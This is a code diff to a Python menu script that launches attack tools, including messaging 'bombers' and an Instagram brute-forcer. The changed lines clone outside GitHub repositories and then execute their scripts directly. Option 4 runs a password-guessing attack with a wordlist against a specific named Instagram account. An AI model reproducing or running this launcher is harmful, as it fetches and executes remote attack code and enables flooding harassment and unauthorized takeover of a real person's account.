@@ -32,18 +32,33 @@ print("[3]-WhatsApp Bomber")
 print("[4]-Instagram Bruter")
 
 
-os.chdir('..')
+
 if not os.path.isdir("bohca"):
      os.mkdir("bohca")
 os.chdir("bohca")
 
+#a = int(input())
 a = input('''Enter Number:''')
 if '1' in a:
-    os.system("git clone https://github.com/donlachin/yilan.git")
+	os.system("git clone https://github.com/donlachin/yilan.git")
+	os.chdir("yilan")
+	os.system("./yilan.sh")
 if '2' in a:
-    os.system("git clone https://github.com/Nikait/ni_bomber.git")
+	os.system("git clone https://github.com/Nikait/ni_bomber.git")
+	os.chdir("ni_bomber")
+	os.system("python3 ni_bomber.py")
 if '3' in a:
-    os.system("git clone https://github.com/TAIROV1/WBomb.git")
+	os.system("git clone https://github.com/Aziz961/WBomb.git")
+	os.chdir("WBomb")
+	os.system("chmod +x install.sh")
+	os.system("./install.sh")
+	os.system("python3 wbomb.py")
 if '4' in a:
-    os.system("git clone https://github.com/donlachin/insta.git")
+	os.system("git clone https://github.com/donlachin/insta.git")
+	os.chdir("insta")
+	os.system("python3 instagram.py sakina_1988 sakina.list -m 0")
+
+
+
+
 
